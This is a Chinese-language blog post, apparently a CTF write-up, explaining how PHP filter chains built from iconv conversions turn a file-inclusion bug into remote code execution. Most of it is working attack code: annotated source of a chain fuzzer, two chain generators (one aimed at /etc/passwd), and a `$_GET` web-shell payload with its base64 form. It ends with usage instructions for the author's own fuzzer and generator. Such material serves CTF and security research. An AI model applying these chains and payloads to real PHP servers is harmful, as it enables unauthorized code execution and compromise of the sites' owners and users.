&quot;�͵i�&quot;php://filter/convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode/resource=data://,aaa334d3231 string(4) &quot;3M21&quot;\n\n可以看到 当我们增加对应字符的编码串的时候 他会在原字符串的前端生成对应字符。\n那么思路就明确了，比如我们要构造生成下面这样的php payload\n&lt;?=`$_GET[0]`;;?&gt;\n\n我们只需要构造他的base64形式的反转形式最后解码，就能在字符串前端生成我们的payload了\nPD89YCRfR0VUWzBdYDs7Pz4=` ——&gt; `4zP7sDYdBzWUV0RfRCY98DP\n\nFuzz在了解基本原理之后，我们要做的就是使用编码构造一份字典，对应base64编码中每一个合法字符。\nwupco师傅已经开源过fuzz的项目了，所以我们在下面的项目分析里面直接跟进就好x\n项目分析PHP_INCLUDE_TO_SHELL_CHAR_DICT @wupco在根据wupco师傅项目的同时把fuzz原理也一并阐述\n（因为师傅的项目里面都写好了hhh~所以我就简单注释一下代码都做了什么x）\n\n先简单说一下各个文件是做什么的x\n\nres文件夹中是fuzz好的字典，每个文件名对应一个字符hexcode，文件内容是fuzz好的链子x\n\n（2f the hexcode of “/“)\n\n\nfuzzer.php是用于fuzz构建res字典的核心程序，通过以现有的（通常是以C的编码：convert.iconv.L1.ISO2022KR为基础进行编码变异，逐步构建其他其他字符。\ninit构建时候利用的文件，即resource=指向的文件，默认为abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM（足够的长x）\ntest.py用于生成filter链，他会匹配字典中对应字符的hexcode进行拼接，同时会在test.php中生成对应的样例程序：\n\n\n\ntest.php由test.py生成的包含对应payload的测试样例，包含test.py中file_to_use变量指向的文件：\n\n\n\nphpresult一个对/etc/passwd利用后的样例（？看样子是成功给&#x2F;etc&#x2F;passwd文件写入了payload（？\n\n每个文件大概做什么我们就介绍完了，下面跟进两个核心部分，一个是fuzz脚本一个是生成脚本(test.py):\n\nfuzz.php\n\n&lt;?phperror_reporting(E_ALL &amp; ~E_WARNING);ini_set(&quot;memory_limit&quot;, &quot;-1&quot;);set_time_limit(0);if(!file_exists(&quot;./init&quot;))&#123;    file_put_contents(&#x27;./init&#x27;,&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM&#x27;); &#125;$input = &#x27;./init&#x27;;$iconv_list = [&#x27;437&#x27;,&#x27;500&#x27;,&#x27;500V1&#x27;,&#x27;850&#x27;,&#x27;851&#x27;.....];// iconv -l生成，太长了所以省略，你也可以在这里定义你想用到的编码集$filter_list = [   &#x27;string.rot13&#x27;,// seem no use    &#x27;convert.iconv.*&#x27;,];print_r($filter_list);$prev_str = &quot;&quot;; # 存储上一个成功的字符链// $news = &quot;&quot;; #好像没意义x// $found_count = 0; #好像没意义x$op_all = &quot;&quot;; #一般是res中的链子当作种子$op_all_max = 2000; #链的最大长度$last_op = &quot;&quot;;# 上一个拼接的链子$init_value = file_get_contents($input);$max_c_len = strlen($init_value) * 5;if(!is_dir(&#x27;./res&#x27;))&#123;    mkdir(&#x27;./res&#x27;);&#125;if(!file_exists(&quot;./res/C&quot;))&#123;   file_put_contents(&#x27;./res/C&#x27;,&#x27;convert.iconv.UTF8.CSISO2022KR&#x27;); #是所有链子的开始，是变异的基础，也是忘不掉的那个人&#125;function getseeds($dir)&#123; //获取文件夹中的所有文件名    $handler = opendir($dir);      while (($filename = readdir($handler)) !== false)     &#123;        if ($filename !== &quot;.&quot; &amp;&amp; $filename !== &quot;..&quot;)         &#123;              $files[] = $filename ;          &#125;     &#125;      closedir($handler);      return $files;&#125;function getRandomSeedFromDir($dir)&#123; //因为这段代码冗余部分太多所以简化成函数了方便理解    $files = getseeds($dir);    $r_t = rand(1,999999) % sizeof($files);    $seed = file_get_contents($dir.&#x27;/&#x27;.$files[$r_t]);    echo &quot;[mutating from exist dic] &quot;.$files[$r_t].&quot;: &quot;.$seed.&quot;\\n&quot;;    return $seed;&#125;while(1)&#123; //这个死循环是fuzz的核心，通过不断的和陌生人(随机数对应的编码串)相识，孜孜不倦的寻找着属于她自己的爱情......啧，多么枯燥且无味（x。    $tmp_str = &quot;&quot;;        //$rand = rand(1,999999);    $op = &#x27;&#x27;;    // if($last_op == $filter_list[0])&#123;        $rand_2 = rand(1,999999);        $rand_3 = rand(1,999999);        $icon1 = $iconv_list[$rand_2 % count($iconv_list)];        $icon2 = $iconv_list[$rand_3 % count($iconv_list)];        $op = str_replace(&#x27;*&#x27;,$icon1.&#x27;.&#x27;.$icon2,$filter_list[1]); //随机拼接，就像每天会遇到无数人一样（    // &#125; else &#123;    //     if($rand % 6 &gt; 1)&#123;    //         $rand_2 = rand(1,999999);    //         $rand_3 = rand(1,999999);    //         $icon1 = $iconv_list[$rand_2 % count($iconv_list)];    //         $icon2 = $iconv_list[$rand_3 % count($iconv_list)];    //         $op = str_replace(&#x27;*&#x27;,$icon1.&#x27;.&#x27;.$icon2,$filter_list[1]);    //     &#125;    //     else&#123;    //         $op =  $filter_list[0];    //     &#125;    // &#125;    $tmp_str = file_get_contents(&#x27;php://filter/&#x27;.$op_all.(($op_all == &quot;&quot;)?&#x27;&#x27;:&#x27;|&#x27;).$op.&#x27;|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7/resource=&#x27;.$input); //将随机拼接好的字符规则进行利用读取并存储在$tmp_str中    # print(&quot;Try fuzz &quot;.&quot;php://filter/&quot;.$op_all.(($op_all == &quot;&quot;)?&#x27;&#x27;:&#x27;|&#x27;).$op.&#x27;|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7/resource=&#x27;.$input.&quot;\\n&quot;); //添加了对应的输出文本x    if(!$tmp_str)&#123; //如果$tmp_str不存在（拼接之后不能生成）就跳过        continue;    &#125;    if($tmp_str === $prev_str)&#123;        continue; //如果和上一次结果一样就跳过x    &#125;    if(strlen($op_all)&gt;$op_all_max)&#123; //如果长度超过最大设定长度就置空        $last_op = &quot;&quot;;        if(rand(1,999999)% 5 &gt; 2)&#123;            $op_all = &quot;&quot;;            continue;        &#125;        /*            获取res文件夹中存在的字典作为基础种子进行再拼接        */         // $r_t = rand(1,999999);        // $files = getseeds(&#x27;./res/&#x27;);        // $r_t = $r_t % sizeof($files);        // $seed = file_get_contents(&#x27;./res/&#x27;.$files[$r_t]);        // $op_all = $seed;        $op_all = $op_all = getRandomSeedFromDir(&#x27;./res/&#x27;);        # echo &quot;[mutating from exist dic] &quot;.$files[$r_t].&quot;: &quot;.$seed.&quot;\\n&quot;;        continue;    &#125;    if(strlen($tmp_str) &gt; $max_c_len)&#123;        $last_op = &quot;&quot;;        if(rand(1,999999)% 5 &gt; 2)&#123;            $op_all = &quot;&quot;;            continue;        &#125;        // $r_t = rand(1,999999);        // $files = getseeds(&#x27;./res/&#x27;);        // $r_t = $r_t % sizeof($files);        // $seed = file_get_contents(&#x27;./res/&#x27;.$files[$r_t]);        // $op_all = $seed;        $op_all = $op_all = getRandomSeedFromDir(&#x27;./res/&#x27;);        # echo &quot;[mutating from exist dic] &quot;.$files[$r_t].&quot;: &quot;.$seed.&quot;\\n&quot;;        continue;    &#125;    $r = strstr($tmp_str,&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;,true);    if($r === false)&#123;        # print(&quot;Oh $r is non-compliance ! skip now! \\n&quot;);        continue;    &#125;    preg_match_all(&quot;/([a-zA-Z0-9])/&quot;,$r, $res);    if(sizeof($res[0])===strlen($r) &amp;&amp; sizeof($res[0])==1 )&#123;        //$ttt = quoted_printable_encode($tmp_str);            // echo &quot;[!!] Magic:\\n ------------------------------------------\\n &quot; . $tmp_str . &quot;\\n&quot;;            if(file_exists(&quot;./res/&quot;.$r))&#123; //即使爱情已经存在，但她依然想最求更好的未来                $size = strlen(file_get_contents(&quot;./res/&quot;.$r));                if($size&gt;strlen($op_all.(($op_all == &quot;&quot;)?&#x27;&#x27;:&#x27;|&#x27;).$op))&#123;//所以当她遇上更好的，会毅然的离开(指匹配到更优更短的串)                    file_put_contents(&quot;./res/&quot; . $r,  $op_all.(($op_all == &quot;&quot;)?&#x27;&#x27;:&#x27;|&#x27;).$op);                    print(&quot;Got Superior (of shorter length):$r &quot;.$op_all.(($op_all == &quot;&quot;)?&#x27;&#x27;:&#x27;|&#x27;).$op.&quot;\\n&quot;);                &#125;            &#125;            else&#123;//空虚的内心似乎得到了眷顾，这是第一次她遇见的爱情，她欣然接受(指如果不存在则会直接创建)                print(&quot;Got $r &quot;.$op_all.(($op_all == &quot;&quot;)?&#x27;&#x27;:&#x27;|&#x27;).$op.&quot;\\n&quot;);                file_put_contents(&quot;./res/&quot; . $r, $op_all.(($op_all == &quot;&quot;)?&#x27;&#x27;:&#x27;|&#x27;).$op);            &#125;            //否则她还是会一如既往的，向爱情献上忠诚。            $last_op = &quot;&quot;;            if(rand(1,999999)% 5 &gt; 2)&#123;                $op_all = &quot;&quot;;                continue;            &#125;            // $r_t = rand(1,999999);            // $files = getseeds(&#x27;./res/&#x27;);            // $r_t = $r_t % sizeof($files);            // $seed = file_get_contents(&#x27;./res/&#x27;.$files[$r_t]);            $op_all = $op_all = getRandomSeedFromDir(&#x27;./res/&#x27;);            # echo &quot;[mutating from exist dic] &quot;.$files[$r_t].&quot;: &quot;.$seed.&quot;\\n&quot;;            continue;    &#125;        if($tmp_str === $init_value)&#123;        $last_op = &quot;&quot;;        if(rand(1,999999)% 5 &gt; 2)&#123;            $op_all = &quot;&quot;;            continue;        &#125;        // $r_t = rand(1,999999);        // $files = getseeds(&#x27;./res/&#x27;);        // $r_t = $r_t % sizeof($files);        // $seed = file_get_contents(&#x27;./res/&#x27;.$files[$r_t]);        $op_all = $op_all = getRandomSeedFromDir(&#x27;./res/&#x27;);        # echo &quot;[mutating from exist dic] &quot;.$files[$r_t].&quot;: &quot;.$seed.&quot;\\n&quot;;        continue;    &#125;    else&#123;        $last_op = $op;        $prev_str = $tmp_str;        $op_all .= (($op_all == &quot;&quot;)?&#x27;&#x27;:&#x27;|&#x27;).$op;    &#125;&#125;?&gt;\n\n下面的test.py是链的生成程序，当你提供payload的base64字符串形式时，他会寻找每个字符hexcode对应的编码进行payload生成。\nfile_to_use = &quot;/etc/passwd&quot;#在这里放入你要生成的payload的base64形式：base64_payload = &quot;YWFh&quot;# generate some garbage base64filters = &quot;convert.iconv.UTF8.CSISO2022KR|&quot;filters += &quot;convert.base64-encode|&quot;# make sure to get rid of any equal signs in both the string we just generated and the rest of the filefilters += &quot;convert.iconv.UTF8.UTF7|&quot;for c in base64_payload[::-1]:        filters += open(&#x27;./res/&#x27;+(str(hex(ord(c)))).replace(&quot;0x&quot;,&quot;&quot;)).read() + &quot;|&quot; # 这里是使用对应字符的hexcode来寻找对应编码，你也可以采用下面的方式，因为fuzz生成器最后生成的结果是按字符名存储并没有hex编码        # filters += open(&#x27;./res/&#x27;+c).read() + &quot;|&quot;        print(&quot;use &quot;+ c + &quot;:&quot; +open(&#x27;./res/&#x27;+c).read())        # decode and reencode to get rid of everything that isn&#x27;t valid base64        filters += &quot;convert.base64-decode|&quot;        filters += &quot;convert.base64-encode|&quot;        # get rid of equal signs        filters += &quot;convert.iconv.UTF8.UTF7|&quot;filters += &quot;convert.base64-decode&quot;final_payload = f&quot;php://filter/&#123;filters&#125;/resource=&#123;file_to_use&#125;&quot;with open(&#x27;test.php&#x27;,&#x27;w&#x27;) as f:    f.write(&#x27;&lt;?php echo file_get_contents(&quot;&#x27;+final_payload+&#x27;&quot;);?&gt;&#x27;)print(final_payload)\n\n单独说一下，convert.iconv.UTF8.UTF7的作用是为了防止中途出现的base64补位的等号导致解释器失效或者报错，所以用它将等号转换为其他字符(base64合法字符)\nphp_filter_chain_generator @synacktiv#!/usr/bin/env python3import argparseimport base64import re# - Useful infos -# https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-php-filters# https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT# https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d# No need to guess a valid filename anymorefile_to_use = &quot;php://temp&quot;conversions = &quot;dic.array&quot;#太长了省略一下xdef generate_filter_chain(chain, debug_base64 = False):    encoded_chain = chain    # generate some garbage base64    filters = &quot;convert.iconv.UTF8.CSISO2022KR|&quot;    filters += &quot;convert.base64-encode|&quot;    # make sure to get rid of any equal signs in both the string we just generated and the rest of the file    filters += &quot;convert.iconv.UTF8.UTF7|&quot;    for c in encoded_chain[::-1]:        filters += conversions[c] + &quot;|&quot;        # decode and reencode to get rid of everything that isn&#x27;t valid base64        filters += &quot;convert.base64-decode|&quot;        filters += &quot;convert.base64-encode|&quot;        # get rid of equal signs        filters += &quot;convert.iconv.UTF8.UTF7|&quot;    if not debug_base64:        # don&#x27;t add the decode while debugging chains        filters += &quot;convert.base64-decode&quot;    final_payload = f&quot;php://filter/&#123;filters&#125;/resource=&#123;file_to_use&#125;&quot;    return final_payloaddef main():    # Parsing command line arguments    parser = argparse.ArgumentParser(description=&quot;PHP filter chain generator.&quot;)    parser.add_argument(&quot;--chain&quot;, help=&quot;Content you want to generate. (you will maybe need to pad with spaces for your payload to work)&quot;, required=False)    parser.add_argument(&quot;--rawbase64&quot;, help=&quot;The base64 value you want to test, the chain will be printed as base64 by PHP, useful to debug.&quot;, required=False)    args = parser.parse_args()    if args.chain is not None:        chain = args.chain.encode(&#x27;utf-8&#x27;)        base64_value = base64.b64encode(chain).decode(&#x27;utf-8&#x27;).replace(&quot;=&quot;, &quot;&quot;)        chain = generate_filter_chain(base64_value)        print(&quot;[+] The following gadget chain will generate the following code : &#123;&#125; (base64 value: &#123;&#125;)&quot;.format(args.chain, base64_value))        print(chain)    if args.rawbase64 is not None:        rawbase64 = args.rawbase64.replace(&quot;=&quot;, &quot;&quot;)        match = re.search(&quot;^([A-Za-z0-9+/])*$&quot;, rawbase64)        if (match):            chain = generate_filter_chain(rawbase64, True)            print(chain)        else:            print (&quot;[-] Base64 string required.&quot;)            exit(1)if __name__ == &quot;__main__&quot;:    main()\n\n其实核心部分就这几行：\nfor c in encoded_chain[::-1]:    filters += conversions[c] + &quot;|&quot;    # decode and reencode to get rid of everything that isn&#x27;t valid base64    filters += &quot;convert.base64-decode|&quot;    filters += &quot;convert.base64-encode|&quot;    # get rid of equal signs    filters += &quot;convert.iconv.UTF8.UTF7|&quot;if not debug_base64:    # don&#x27;t add the decode while debugging chains    filters += &quot;convert.base64-decode&quot;final_payload = f&quot;php://filter/&#123;filters&#125;/resource=&#123;file_to_use&#125;&quot;return final_payload\n\n和test.py其实是一样的，所以不多赘述x，不过相比起来这个更好理解~\nfilterChainFuzzerAndGenerator （自己改了一份优化版本x一个基于php和python的Filter链的fuzz和生成程序。\n可能使用的场景:\n\n无文件RCE\nCTF中的Web\nCTF中的MISC\n……（更多可能？）\n\nAbout你可以在下面这篇文档中了解原理和更多细节\n\n【idekCTF 2022】Paywall — filter链构造和扩展\n\n此外，感谢下面的项目提供的思路\n\nhttps://github.com/loknop https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d\nhttps://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT\nhttps://github.com/synacktiv/php_filter_chain_generator\n\n项目目录各个文件的作用如下：\n\nFuzzer.php 用于Fuzz filter链需要的字典\niconv_list.php Fuzz中字符集文件，可以按照场景自定义对应编码集\ninit Fuzzer包含用文件，基本无需改动\n\n\nGenerator.py 用于生成任意payload的Filter链\naview.py 输出.res 文件夹中字典一览\nget_dic.py 将.res文件夹中的单字符文件转换为自定义的dictionary.py字典\ndictionary.py 单字符字典，可以自定义，默认使用get_dic.py生成\n\nUsageFuzzFuzz依靠Fuzzer.php实现\n在iconv_list.php中定义你fuzz需要的字符集\n\n根据对应环境选择对应的字符集合：\niconv -l\n\n\n在Fuzzer.php中设置好参数：\n\n使用下面命令即可开始Fuzz：\nphp Fuzzer.php\n\nGeneratorFilter链的生成依靠Generator.py实现。\n目前提供两种模式：\n\n使用.res文件夹中原有的hexcode编码字母的链子生成\n使用dictionary.py中的字典生成\n\n如果你要使用第一种模式，项目下载时就附带好了对应hexcode的字典，只需要在文件开头设置参数即可：\n\n当然您也可以根据项目原理自己生成。\n如果您使用第二种模式，项目也准备了一份Fuzz好的单字母字典在dictionary.py中：\n\n您也可以根据自己的需求Fuzz，流程大致如下：\n\n设定好需要的字符集\n运行Fuzzer.php\n使用get_dic.py程序从.res中提取跑好的字典\n\n当然您如果熟悉原理，也可以用您想要的方法，自行修改字典文件dictionary.py。\n当一切准备就绪，直接使用下面命令：\npython Generator.py\n\n即可。\n","categories":["CTF","Develop"],"tags":["Web"]}]